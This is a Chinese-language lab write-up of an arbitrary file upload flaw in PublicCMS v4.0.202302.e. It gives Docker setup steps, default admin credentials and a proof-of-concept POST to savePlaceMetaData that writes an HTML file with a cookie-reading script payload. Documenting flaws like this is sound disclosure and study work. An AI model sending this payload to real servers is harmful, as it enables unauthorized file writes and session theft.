**漏洞名称**

publicCms savePlaceMetaData 任意文件上传漏洞

**漏洞影响**

publicCms v.4.0.202302.e版本

**漏洞描述**

publicCms v.4.0.202302.e版本的/admin/cmsTemplate/savePlaceMetaData组件中存在任意文件上传漏洞，攻击者可通过上传精心制作的文件来执行任意代码。从而导致web服务器沦陷。

**靶场搭建**

publicCms是个开源项目，gitee地址如下，可以使用源码搭建，也可以直接下载运行包

```
https://gitee.com/sanluan/PublicCMS
```

我是使用docker搭建靶场，下载镜像

```
docker pull sanluan/publiccms:V4.0.202302.e
```

启动容器

```
docker run -d -p 8080:8080 sanluan/publiccms:V4.0.202302.e
```

访问程序页面http://localhost:8080/ ,根据页面提示配置并初始化数据库

管理后台访问相对路径为http://localhost:8080/admin/ ,数据脚本内置管理员账号/密码:admin/admin

**漏洞复现**

POC数据包

```yaml
POST /admin/cmsTemplate/savePlaceMetaData HTTP/1.1
Host: localhost:8080
Connection: close
Content-Length: 112
Content-Type: application/x-www-form-urlencoded
Cookie: 

_csrf=e37f6445-3075-4ef1-b425-d75cb720283b&path=tee4.html&content=<img%20src=1%20onerror=alert(document.cookie)>

```

文件回显

http://localhost:8080/includetee4.html

